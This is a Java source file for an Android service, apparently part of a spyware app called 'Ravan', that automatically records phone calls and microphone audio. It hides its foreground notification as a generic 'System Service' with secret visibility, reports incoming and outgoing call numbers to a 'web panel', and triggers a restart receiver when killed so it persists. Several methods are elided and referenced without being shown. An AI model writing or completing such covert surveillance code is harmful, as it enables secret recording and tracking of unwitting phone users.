package com.security.ravan;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Service for call recording and microphone capture
 */
public class CallRecordService extends Service {

    private static final String TAG = "CallRecordService";
    private static final String CHANNEL_ID = "CallRecordServiceChannel";
    private static final int NOTIFICATION_ID = 3003;

    // Shared preferences keys
    public static final String PREFS_NAME = "RavanCallSettings";
    public static final String PREF_AUTO_RECORD_CALLS = "auto_record_calls";
    public static final String PREF_SAVE_ON_DEVICE = "save_on_device";

    // Static instance
    private static CallRecordService instance;

    // MediaRecorder for audio
    private MediaRecorder mediaRecorder;
    private PowerManager.WakeLock wakeLock;

    // Recording state
    private static volatile boolean isRecordingCall = false;
    private static volatile boolean isRecordingMic = false;
    private static String currentRecordingPath = null;
    private static String currentRecordingType = null; // "call" or "mic"
    private static long recordingStartTime = 0;

    // Call info
    private static String currentCallNumber = "";
    private static String currentCallType = ""; // "incoming" or "outgoing"
    private static boolean callInProgress = false;

    // Settings
    private static boolean autoRecordEnabled = true;
    private static boolean saveOnDeviceEnabled = true;

    public static CallRecordService getInstance() {
        return instance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        createNotificationChannel();

        // Initialize WakeLock
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Ravan:CallRecordWakeLock");

        // Load settings
        loadSettings();

        Log.d(TAG, "CallRecordService created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();

            if ("START_SERVICE".equals(action)) {
                startForegroundService();
            } else if ("START_CALL_RECORDING".equals(action)) {
                String phoneNumber = intent.getStringExtra("phone_number");
                String callType = intent.getStringExtra("call_type"); // incoming/outgoing
                startCallRecording(phoneNumber, callType);
            } else if ("STOP_CALL_RECORDING".equals(action)) {
                stopCallRecording();
            } else if ("START_MIC_RECORDING".equals(action)) {
                int duration = intent.getIntExtra("duration", 0); // 0 = indefinite
                startMicRecording(duration);
            } else if ("STOP_MIC_RECORDING".equals(action)) {
                stopMicRecording();
            } else if ("CALL_STATE_CHANGED".equals(action)) {
                int callState = intent.getIntExtra("call_state", 0);
                String phoneNumber = intent.getStringExtra("phone_number");
                handleCallStateChange(callState, phoneNumber);
            } else if ("UPDATE_SETTINGS".equals(action)) {
                boolean autoRecord = intent.getBooleanExtra("auto_record", true);
                boolean saveOnDevice = intent.getBooleanExtra("save_on_device", true);
                updateSettings(autoRecord, saveOnDevice);
            }
        }

        return START_STICKY;
    }

    private void startForegroundService() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setShowWhen(false)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Android 14+
            startForeground(NOTIFICATION_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }

        Log.d(TAG, "CallRecordService started in foreground");
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Service",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("Running background services");
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private void loadSettings() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        autoRecordEnabled = prefs.getBoolean(PREF_AUTO_RECORD_CALLS, true);
        saveOnDeviceEnabled = prefs.getBoolean(PREF_SAVE_ON_DEVICE, true);
        Log.d(TAG, "Settings loaded - AutoRecord: " + autoRecordEnabled + ", SaveOnDevice: " + saveOnDeviceEnabled);
    }

    private void updateSettings(boolean autoRecord, boolean saveOnDevice) {
        autoRecordEnabled = autoRecord;
        saveOnDeviceEnabled = saveOnDevice;

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        prefs.edit()
                .putBoolean(PREF_AUTO_RECORD_CALLS, autoRecord)
                .putBoolean(PREF_SAVE_ON_DEVICE, saveOnDevice)
                .apply();

        Log.d(TAG, "Settings updated - AutoRecord: " + autoRecord + ", SaveOnDevice: " + saveOnDevice);
    }

    // Called when phone state changes (from CallReceiver)
    public void handleCallStateChange(int callState, String phoneNumber) {
        // ... method content ...
        Log.d(TAG, "Call state changed: " + callState + ", number: " + phoneNumber);

        switch (callState) {
            case 1: // RINGING (incoming call)
                currentCallNumber = phoneNumber != null ? phoneNumber : "Unknown";
                currentCallType = "incoming";
                callInProgress = true;

                // Notify web panel
                notifyCallIncoming(phoneNumber);

                // Auto-record if enabled
                if (autoRecordEnabled) {
                    startCallRecording(phoneNumber, "incoming");
                }
                break;

            case 2: // OFFHOOK (call answered or outgoing call)
                if (!callInProgress) {
                    // This is an outgoing call
                    currentCallNumber = phoneNumber != null ? phoneNumber : "Unknown";
                    currentCallType = "outgoing";
                    callInProgress = true;

                    // Notify web panel
                    notifyCallOutgoing(phoneNumber);

                    // Auto-record if enabled
                    if (autoRecordEnabled && !isRecordingCall) {
                        startCallRecording(phoneNumber, "outgoing");
                    }
                }
                break;

            case 0: // IDLE (call ended)
                callInProgress = false;

                // Stop recording if in progress
                if (isRecordingCall) {
                    stopCallRecording();
                }

                notifyCallEnded();

                currentCallNumber = "";
                currentCallType = "";
                break;
        }
    }

    // ... existing methods ...

    private void updateNotification(String text) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Intent notificationIntent = new Intent(this, MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                    PendingIntent.FLAG_IMMUTABLE);

            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("System Service")
                    .setContentText("Running...") // Minimized text
                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                    .setContentIntent(pendingIntent)
                    .setOngoing(true)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                    .setShowWhen(false)
                    .build();

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.notify(NOTIFICATION_ID, notification);
            }
        }
    }

    // ... existing methods ...

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "CallRecordService onDestroy");

        // Send broadcast to restart
        Intent broadcastIntent = new Intent(this, RestartReceiver.class);
        sendBroadcast(broadcastIntent);

        if (isRecordingCall) {
            stopCallRecording();
        }
        if (isRecordingMic) {
            stopMicRecording();
        }

        releaseMediaRecorder();
        releaseWakeLock();
        instance = null;
    }
}
